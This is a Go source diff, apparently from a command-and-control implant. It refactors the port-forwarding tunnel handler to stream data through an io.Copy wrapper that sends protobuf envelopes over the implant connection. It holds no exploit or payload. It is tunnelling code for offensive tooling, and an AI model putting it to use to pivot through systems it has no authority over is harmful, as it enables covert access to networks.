@@ -154,6 +154,29 @@ func shellReqHandler(envelope *pb.Envelope, connection *transports.Connection) {
 
 }
 
+type dataWrapper struct {
+	conn   *transports.Connection
+	tunnel *transports.Tunnel
+}
+
+func (d dataWrapper) Write(p []byte) (n int, err error) {
+	n = len(p)
+	err = nil
+	if n == 0 {
+		err = io.EOF
+		return
+	}
+	data, err := proto.Marshal(&pb.TunnelData{
+		TunnelID: d.tunnel.ID,
+		Data:     p,
+	})
+	d.conn.Send <- &pb.Envelope{
+		Type: pb.MsgTunnelData,
+		Data: data,
+	}
+	return
+}
+
 func portfwdHandler(envelope *pb.Envelope, connection *transports.Connection) {
 	pfwdReq := &pb.PortFwdReq{}
 	err := proto.Unmarshal(envelope.Data, pfwdReq)
@@ -179,14 +202,14 @@ func portfwdHandler(envelope *pb.Envelope, connection *transports.Connection) {
 	}
 
 	// Cleanup function with arguments
-	cleanup := func(reason string) {
+	cleanup := func() {
 		// {{if .Debug}}
-		log.Printf("[portfwd] Closing tunnel %d, reason: %s", tunnel.ID, reason)
+		log.Printf("[portfwd] Closing tunnel %d", tunnel.ID)
 		// {{end}}
 		connection.RemoveTunnel(tunnel.ID)
 		tunnelClose, _ := proto.Marshal(&pb.TunnelClose{
 			TunnelID: tunnel.ID,
-			Err:      reason,
+			Err:      "Error",
 		})
 		connection.Send <- &pb.Envelope{
 			Type: pb.MsgTunnelClose,
@@ -195,31 +218,17 @@ func portfwdHandler(envelope *pb.Envelope, connection *transports.Connection) {
 		// Close connection
 		conn.Close()
 	}
-
+	wrapper := dataWrapper{
+		conn:   connection,
+		tunnel: tunnel,
+	}
 	go func() {
-		for {
-			readBuf := make([]byte, readBufSize)
-			n, err := tunnel.Reader.Read(readBuf)
-			if err == io.EOF {
-				//{{if .Debug}}
-				log.Printf("[portfwd] Read EOF on tunnel %d", tunnel.ID)
-				//{{end}}
-				defer cleanup("EOF")
-				return
-			}
+		defer cleanup()
+		_, err := io.Copy(wrapper, tunnel.Reader)
+		if err != nil {
 			//{{if .Debug}}
-			if n > 0 {
-				log.Printf("[portfwd] stdout %d bytes on tunnel %d\n", n, tunnel.ID)
-			}
+			log.Printf("Err during io.Copy: %v\n", err)
 			//{{end}}
-			data, err := proto.Marshal(&pb.TunnelData{
-				TunnelID: tunnel.ID,
-				Data:     readBuf[:n],
-			})
-			connection.Send <- &pb.Envelope{
-				Type: pb.MsgTunnelData,
-				Data: data,
-			}
 		}
 	}()
 
